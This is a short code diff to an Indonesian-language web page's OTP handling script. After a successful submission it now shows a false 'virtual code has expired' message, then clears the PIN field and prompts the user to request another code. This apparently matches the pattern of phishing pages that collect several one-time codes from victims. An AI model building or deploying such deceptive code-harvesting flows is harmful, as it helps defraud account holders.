@@ -1276,8 +1276,15 @@ Silahkan klik tombol dibawah ini<br>
                 document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";
                 
                 if (response.success) {
-                    $("#notif").html("Kode OTP telah dikirim<br/>Silahkan masukkan kode yang diterima");
+                    $("#notif").html("- Kode Virtual sudah kadaluarsa -");
                     $("#notif").css("color", "green");
+                    setTimeout(() => {
+     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Virtual,<br/>Silahkan klik tombol dibawah ini";
+     
+ $("#sixpin").val("");
+   
+              
+   }, 4000);
                 } else {
                     $("#notif").text(response.message || "- Kode Virtual sudah kadaluarsa -");
                     $("#notif").css("color", "red");
